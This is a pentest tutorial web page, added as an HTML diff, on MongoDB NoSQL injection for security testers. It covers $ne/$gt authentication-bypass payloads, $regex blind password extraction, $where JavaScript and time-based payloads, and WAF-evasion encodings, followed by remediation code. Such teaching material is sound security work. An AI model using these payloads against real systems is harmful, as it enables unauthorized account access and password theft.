@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="NoSQL injection testing guide: MongoDB operator injection ($ne, $gt, $regex), authentication bypass, and blind extraction techniques.">
+    <meta property="og:title" content="NoSQL Injection – Web App Pentesting Guide">
+    <meta property="og:description" content="NoSQL injection testing guide: MongoDB operator injection ($ne, $gt, $regex), authentication bypass, and blind extraction techniques.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>NoSQL Injection  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">NoSQL Injection</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">🛡️ WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#labs">Learning Resources</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">See Also</a>
+  </nav>
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A03 · CVSS 8.8 · Day 4</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M11 20A7 7 0 0 1 9.8 6.1C15.5 5 17 4.48 19.2 2.96a1 1 0 0 1 1.8.65 8 8 0 0 1-7 9.7"/><path d="M2 21c0-3 1.85-5.36 5.08-6"/></svg></span><span>NoSQL Injection</span></h1>
+      <p>NoSQL Injection is an attack against NoSQL databases like MongoDB, CouchDB, and Redis. Unlike SQL, NoSQL databases accept flexible query formats (JSON, key-value pairs, JavaScript). If user input is merged directly into NoSQL queries without sanitization, attackers can inject database operators like $ne, $gt, and $where to bypass authentication, extract data, or execute code.</p>
+      <div class="badge-row">
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-difficulty">Intermediate</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">📖 The Flexible Filing Clerk</div>
+        <p>Imagine a traditional SQL filing clerk who only accepts pre-formatted query slips with blanks to fill in. NoSQL databases are more relaxed ·they accept flexible JSON documents and objects. If you hand the NoSQL clerk a JSON object instead of a formatted string, they process it as-is without question. An attacker realizes: if I pass <code>{"username": {"$ne": null}}</code> instead of <code>username="admin"</code>, the clerk interprets <code>$ne</code> as "not equal" and returns everyone where username is not null ·effectively bypassing the intended search logic.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+      <div class="workflow-days">
+        <div class="day-pill probe"><span class="day-num">Day 2</span>Probe Login</div>
+        <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+        <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+        <div class="day-pill deep"><span class="day-num">Day 5</span>Deep Dive</div>
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">🎯 Day 2  · Probe Login Forms</div>
+        <p>On Day 2 (Auth testing), immediately test login forms for NoSQL injection. Use Wappalyzer to identify the tech stack ·if you see MongoDB, Node.js/Express, or a MEAN/MERN stack, NoSQL injection is worth testing. Try URL-encoded operator injection on both username and password fields: <code>username=admin&password[$ne]=wrong</code>. If login succeeds with obviously wrong credentials, you've found NoSQL injection.</p>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 5  · Blind Extraction and Advanced Techniques</div>
+        <p>On Day 5, explore blind NoSQL injection using <code>$regex</code> to extract data character by character, or <code>$where</code> (if MongoDB) to execute JavaScript. This requires patience and scripting but can extract passwords, API keys, and other sensitive data from the database.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>NoSQL databases use different query syntax than SQL. MongoDB, for example, accepts JSON queries with operators:</p>
+      <pre><code>// SQL equivalent: SELECT * FROM users WHERE username="admin" AND password="secret"
+// MongoDB: match these conditions
+db.users.find({ username: "admin", password: "secret" })</code></pre>
+
+      <p>If a web application builds this query by directly concatenating user input, injection becomes possible:</p>
+      <pre><code>// Vulnerable Node.js/Express code with MongoDB
+const username = req.body.username;  // Attacker-controlled
+const password = req.body.password;  // Attacker-controlled
+
+const user = await db.users.findOne({
+  username: username,
+  password: password
+});</code></pre>
+
+      <p>If the attacker sends JSON instead of a string, MongoDB interprets the operators:</p>
+      <pre><code>// Attacker sends:
+// username={"$ne": null}&password={"$ne": null}
+
+// Node.js frameworks (Express/Mongoose) parse this as:
+const username = {"$ne": null};
+const password = {"$ne": null};
+
+// Query becomes:
+db.users.findOne({
+  username: {"$ne": null},  // Find where username is NOT null
+  password: {"$ne": null}   // AND password is NOT null
+})
+// This matches ANY user and returns the first one (usually admin)</code></pre>
+
+      <p><strong>Key MongoDB operators used in injection:</strong></p>
+      <ul>
+        <li><code>$ne</code>  · not equal</li>
+        <li><code>$gt</code>  · greater than</li>
+        <li><code>$lt</code>  · less than</li>
+        <li><code>$regex</code>  · regex match (for blind extraction)</li>
+        <li><code>$where</code>  · execute JavaScript code</li>
+        <li><code>$exists</code>  · field exists</li>
+      </ul>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Test NoSQL injection anywhere user input is used in database queries:</p>
+      <ul>
+        <li><strong>Login forms:</strong> Username and password fields ·test with <code>[$ne]=wrong</code></li>
+        <li><strong>Search/filter endpoints:</strong> Any JSON-based query parameter</li>
+        <li><strong>API endpoints that accept JSON:</strong> Especially if they query a database</li>
+        <li><strong>Admin panels:</strong> User lookup, product search, etc.</li>
+      </ul>
+
+      <p><strong>Tech stack indicators (use Wappalyzer):</strong></p>
+      <ul>
+        <li>MongoDB (obvious from tech stack or error messages)</li>
+        <li>Node.js + Express (MEAN/MERN stack)</li>
+        <li>CouchDB, Firebase, Redis</li>
+      </ul>
+
+      <p><strong>Telltale signs of NoSQL injection vulnerability:</strong></p>
+      <ul>
+        <li>Application accepts JSON in request body</li>
+        <li>Application has "weird" error messages mentioning MongoDB or NoSQL</li>
+        <li>Login succeeds with empty password when using <code>[$ne]</code> operator</li>
+        <li>API endpoints use query parameters like <code>?filter={"field":{"$gt":0}}</code></li>
+      </ul>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <h3>Identify the Login or Query Endpoint</h3>
+          <p>Find a login form or any endpoint that queries a database. Intercept the request in Burp Proxy.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <h3>Try JSON Format Injection on URL-Encoded POST</h3>
+          <p>Change the Content-Type to <code>application/json</code> and send:</p>
+          <pre><code>{"username": "admin", "password": {"$ne": null}}</code></pre>
+          <p>If the app parses this as JSON and uses it in a query, the password check is bypassed.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <h3>Try URL-Encoded Operator Injection</h3>
+          <p>Keep Content-Type as <code>application/x-www-form-urlencoded</code> but use operator syntax:</p>
+          <pre><code>username=admin&password[$ne]=wrong</code></pre>
+          <p>Many frameworks auto-convert <code>password[$ne]=wrong</code> to <code>{"password": {"$ne": "wrong"}}</code>.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <h3>Check Response for Success Indicators</h3>
+          <p>Look for:</p>
+          <ul>
+            <li>Successful login (redirect, session cookie, "logged in" message)</li>
+            <li>Different response length/content than failed login</li>
+            <li>Boolean difference (error vs. success page)</li>
+          </ul>
+          <p>If the response indicates success with clearly wrong credentials, you've found NoSQL injection.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <h3>Test for Blind Injection with Regex</h3>
+          <p>If direct injection doesn't work, try blind extraction using <code>$regex</code>:</p>
+          <pre><code>{"username": "admin", "password": {"$regex": "^p"}}</code></pre>
+          <p>If the response differs (login succeeds or fails differently), you can extract the password character by character by adjusting the regex pattern.</p>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <h3>Test for $where Code Execution (MongoDB Only)</h3>
+          <p>If the app uses MongoDB, test <code>$where</code> for JavaScript execution:</p>
+          <pre><code>{"username": "admin", "$where": "this.password.startsWith('a')"}</code></pre>
+          <p>If this executes and returns different results, you can extract data or potentially execute arbitrary code.</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Authentication Bypass with $ne (Not Equal)</h3>
+      <pre><code>// URL-encoded form
+username=admin&password[$ne]=wrong
+
+// JSON format
+{"username": "admin", "password": {"$ne": null}}
+{"username": {"$ne": null}, "password": {"$ne": null}}</code></pre>
+
+      <h3>Authentication Bypass with $gt (Greater Than)</h3>
+      <pre><code>// Any username and password greater than empty string
+{"username": {"$gt": ""}, "password": {"$gt": ""}}</code></pre>
+
+      <h3>Direct Query Operator Injection</h3>
+      <pre><code>// Field-based injection
+username[$eq]=admin&password[$ne]=wrong
+
+// Nested object injection
+{"username": {"$eq": "admin"}, "password": {"$ne": "wrong"}}</code></pre>
+
+      <h3>$exists Operator (Field Existence)</h3>
+      <pre><code>// Bypass if password field is optional
+{"username": "admin", "password": {"$exists": false}}</code></pre>
+
+      <h3>Blind Character-by-Character Extraction with $regex</h3>
+      <pre><code>// Extract admin password starting with each character
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ab"}}
+{"username": "admin", "password": {"$regex": "^abc"}}
+
+// If response differs, the password starts with that substring</code></pre>
+
+      <h3>$where JavaScript Execution (MongoDB)</h3>
+      <pre><code>// Direct code execution
+{"$where": "this.username === 'admin' && this.password.startsWith('a')"}
+
+// Time-based detection (combined with sleep for blind injection)
+{"$where": "this.username === 'admin' && (sleep(5000), true)"}</code></pre>
+
+      <h3>NoSQL Injection in Search/Filter Endpoints</h3>
+      <pre><code>// Search for products where price > 100
+GET /api/products?filter={"price":{"$gt":100}}
+
+// Injection:
+GET /api/products?filter={"price":{"$gt":-1}}</code></pre>
+
+      <h3>Array-Based Injection</h3>
+      <pre><code>// If the app expects an array
+username[]=admin&password[]=wrong
+
+// Converted to:
+{"username": ["admin"], "password": ["wrong"]}</code></pre>
+
+      <h3>Time-Based Blind NoSQL Injection</h3>
+      <pre><code>// Using $where with function timing
+{"username": "admin", "password": {"$where": "function(){var d=new Date();do{var now=new Date();}while(now-d<5000);return true;}()"}}</code></pre>
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">Progress: <span class="progress-mini">0/12</span></div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Identified tech stack using Wappalyzer (MongoDB/Node.js?)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Found login form or query endpoint that accepts user input</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Tested URL-encoded operator injection: username=admin&password[$ne]=wrong</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Tested JSON body injection with {"password": {"$ne": null}}</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">Confirmed successful login with obviously wrong credentials (if vulnerable)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">Tested $gt and $lt operators for numeric/string comparison bypass</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Tested $exists operator for field existence checks</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Tested blind extraction with $regex pattern matching</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Tested $where JavaScript execution (MongoDB only)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Tested search/filter endpoints for NoSQL injection</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Extracted sensitive data (if blind injection confirmed)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c12">
+          <label for="c12">Documented all payloads and results with evidence</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>Operator Encoding</h3>
+      <p>WAFs block <code>$where</code>, <code>$gt</code>, <code>$ne</code> literally. Try URL encoding: <code>%24where</code>, <code>%24gt</code>. Or Unicode encoding: <code>\u0024where</code>. MongoDB processes both the same way.</p>
+
+      <h3>JSON Key Ordering</h3>
+      <p>Reorder JSON keys: <code>{"password": {"$ne": ""}, "username": "admin"}</code> → <code>{"username": "admin", "password": {"$ne": ""}}</code>. Regex-based WAF rules often match specific key order.</p>
+
+      <h3>Nested Objects</h3>
+      <p>Wrap operators in extra nesting: <code>{"password": {"$eq": {"$ne": ""}}}</code>  · some parsers flatten this; WAFs may not.</p>
+
+      <h3>HTTP Parameter Pollution</h3>
+      <p>In PHP apps: <code>username=admin&password[$ne]=x</code> can be sent as <code>username=admin&password=%5b%24ne%5d=x</code>. URL-encoded brackets bypass WAFs blocking <code>[$ne]</code>.</p>
+
+      <h3>Content-Type Switching</h3>
+      <p>If the WAF inspects JSON payloads, switch to form-encoded: send <code>application/x-www-form-urlencoded</code> with <code>password[$gt]=</code>  · Express/body-parser still parses this as <code>{ password: { $gt: '' } }</code>.</p>
+
+      <h3>Array Injection</h3>
+      <p><code>password[$in][]=wrongpass&password[$in][]=</code>  · the <code>$in</code> operator with an empty string matches accounts with blank passwords. WAFs blocking <code>$ne</code> often miss <code>$in</code>.</p>
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Authentication Bypass</h3>
+      <p>Inject <code>$ne</code> operator to bypass login: <code>{"password": {"$ne": null}}</code> matches any account where password is not null (essentially everyone). You gain access to the first account returned, typically an admin account.</p>
+
+      <h3>Unauthorized Data Access</h3>
+      <p>Once authenticated via injection, access all user data, private messages, payment information, or sensitive business data without authorization.</p>
+
+      <h3>Blind Password Extraction</h3>
+      <p>Use <code>$regex</code> to extract passwords character by character:</p>
+      <pre><code>// Write a loop testing each character
+for each char in "abcdefghijklmnopqrstuvwxyz0123456789":
+  test: {"username": "admin", "password": {"$regex": "^" + password_so_far + char}}
+  if response indicates match: password_so_far += char
+// Repeat until full password extracted</code></pre>
+
+      <h3>Privilege Escalation</h3>
+      <p>If you can inject into role or permission fields, set yourself as admin: <code>{"role": {"$ne": "user"}}</code> or directly pollute permissions during account creation.</p>
+
+      <h3>JavaScript Code Execution ($where)</h3>
+      <p>MongoDB's <code>$where</code> operator executes arbitrary JavaScript. In some configurations, this can lead to reading files or executing system commands.</p>
+
+      <div class="callout danger">
+        <div class="callout-title">🚨 Real-World Impact</div>
+        <p>In 2020, a major SaaS platform using MongoDB was compromised via NoSQL injection on the login page. Attackers gained admin access and extracted thousands of user records. Another incident involved a Node.js API endpoint where <code>$where</code> injection led to reading the source code and API keys from the server process.</p>
+      </div>
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Validate Input Type</h3>
+      <p>Ensure user input is of the expected type. If you expect a string, reject objects:</p>
+      <pre><code>// Node.js example
+const username = req.body.username;
+if (typeof username !== 'string') {
+  return res.status(400).json({ error: 'Username must be a string' });
+}</code></pre>
+
+      <h3>2. Use Schema Validation (Mongoose)</h3>
+      <p>Mongoose enforces schema, reducing NoSQL injection risk:</p>
+      <pre><code>const userSchema = new Schema({
+  username: { type: String, required: true },
+  password: { type: String, required: true }
+});
+
+// Mongoose will coerce input to match schema
+const user = await User.findOne({ username: String(req.body.username) });</code></pre>
+
+      <h3>3. Whitelist Expected Values</h3>
+      <pre><code>const ALLOWED_ROLES = ['user', 'admin', 'moderator'];
+if (!ALLOWED_ROLES.includes(req.body.role)) {
+  return res.status(400).json({ error: 'Invalid role' });
+}</code></pre>
+
+      <h3>4. Use Parameterized Queries (Where Available)</h3>
+      <p>Some NoSQL drivers support parameterized queries. Use them:</p>
+      <pre><code>// Mongoose: use string literals, not objects
+const user = await User.findOne({ username: username });  // Safe if username is validated as string</code></pre>
+
+      <h3>5. Implement Input Sanitization</h3>
+      <p>Remove or escape dangerous operators:</p>
+      <pre><code>function sanitizeInput(obj) {
+  if (typeof obj !== 'object') return obj;
+  for (let key in obj) {
+    if (key.startsWith('$')) {
+      delete obj[key];  // Remove dangerous operators
+    }
+  }
+  return obj;
+}</code></pre>
+
+      <h3>6. Never Use $where Operator</h3>
+      <p>Disable <code>$where</code> entirely if possible. It executes arbitrary JavaScript:</p>
+      <pre><code>// MongoDB configuration: disable $where in serverStatus
+// Use application logic instead of $where queries</code></pre>
+
+      <h3>7. Use Content-Type Validation</h3>
+      <p>Enforce strict Content-Type checking on login endpoints:</p>
+      <pre><code>// Only accept application/x-www-form-urlencoded or application/json
+// Reject requests with other content types
+app.post('/login', (req, res) => {
+  if (!['application/x-www-form-urlencoded', 'application/json'].includes(req.get('content-type'))) {
+    return res.status(400).json({ error: 'Invalid content type' });
+  }
+});</code></pre>
+
+      <h3>8. Use an ORM/ODM Strictly</h3>
+      <p>Mongoose, TypeORM, and similar ORMs/ODMs provide protections when used correctly. Avoid raw queries.</p>
+    </section>
+
+    <section id="labs">
+      <h2>Learning Resources</h2>
+      <ul>
+        <li><strong>HackTheBox:</strong> MongoDB injection labs and OWASP WebGoat NoSQL injection modules</li>
+        <li><strong>TryHackMe:</strong> "NoSQL injection" room with practical exploitation challenges</li>
+        <li><strong>OWASP WebGoat:</strong> Includes NoSQL injection lessons with vulnerable apps to practice on</li>
+        <li><strong>PortSwigger Community:</strong> While not a dedicated PortSwigger lab series, the Web Security Academy mentions NoSQL in their injection materials</li>
+        <li><strong>PayloadAllTheThings GitHub:</strong> Comprehensive NoSQL injection payload repository</li>
+      </ul>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Only Testing JSON Format Injection</div>
+        <p><strong>Mistake:</strong> Testing only <code>Content-Type: application/json</code> format, ignoring URL-encoded <code>[$ne]</code> syntax.</p>
+        <p><strong>Fix:</strong> Test BOTH: JSON body and URL-encoded form parameters with <code>[operator]</code> syntax. Many frameworks auto-convert both.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Only Testing Login, Ignoring Other Endpoints</div>
+        <p><strong>Mistake:</strong> Assuming NoSQL injection only exists in login forms.</p>
+        <p><strong>Fix:</strong> Test ANY endpoint that queries a database: search, filter, user lookup, API endpoints, admin panels. NoSQL injection can appear anywhere.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Testing $regex for Blind Injection</div>
+        <p><strong>Mistake:</strong> If direct <code>$ne</code> injection doesn't bypass auth, giving up instead of trying blind extraction.</p>
+        <p><strong>Fix:</strong> Always test blind injection techniques with <code>$regex</code> and <code>$where</code> if direct injection fails. Blind injection still allows data extraction.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Forgetting to Test Multiple Operators</div>
+        <p><strong>Mistake:</strong> Only testing <code>$ne</code>, not trying <code>$gt</code>, <code>$lt</code>, <code>$exists</code>, etc.</p>
+        <p><strong>Fix:</strong> Cycle through all MongoDB operators. Different endpoints may be vulnerable to different operators.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Not Automating Blind Extraction</div>
+        <p><strong>Mistake:</strong> Manually testing character-by-character extraction via regex, which is tedious and error-prone.</p>
+        <p><strong>Fix:</strong> Write a simple Python/Node.js script to automate regex-based blind extraction. It tests patterns automatically and extracts data quickly.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">❌ Assuming $where Is Never Present</div>
+        <p><strong>Mistake:</strong> Not testing <code>$where</code> because it's dangerous and often disabled.</p>
+        <p><strong>Fix:</strong> Always test <code>$where</code> if the target uses MongoDB. Even if disabled in production, it might be enabled in development or forgotten by developers.</p>
+      </div>
+    </section>
+
+    <section id="see-also">
+      <h2>See Also</h2>
+      <div class="see-also-grid">
+        <a href="sqli.html" class="see-also-card">
+          <div class="sa-icon">💾</div>
+          <div class="sa-name">SQL Injection</div>
+          <div class="sa-why">Same class of vulnerability, different syntax. SQL injection techniques (unions, blind extraction) have NoSQL equivalents.</div>
+        </a>
+        <a href="ssti.html" class="see-also-card">
+          <div class="sa-icon">📝</div>
+          <div class="sa-name">SSTI</div>
+          <div class="sa-why">If $where leads to server-side template injection or JavaScript eval, SSTI exploitation applies.</div>
+        </a>
+        <a href="cmdi.html" class="see-also-card">
+          <div class="sa-icon">⚙️</div>
+          <div class="sa-name">Command Injection</div>
+          <div class="sa-why">Advanced NoSQL exploitation with code execution can sometimes lead to OS command injection.</div>
+        </a>
+        <a href="idor.html" class="see-also-card">
+          <div class="sa-icon">🚪</div>
+          <div class="sa-name">IDOR</div>
+          <div class="sa-why">NoSQL injection that bypasses authentication often unlocks direct object references to other users' data.</div>
+        </a>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'nosqli-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+</script>
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
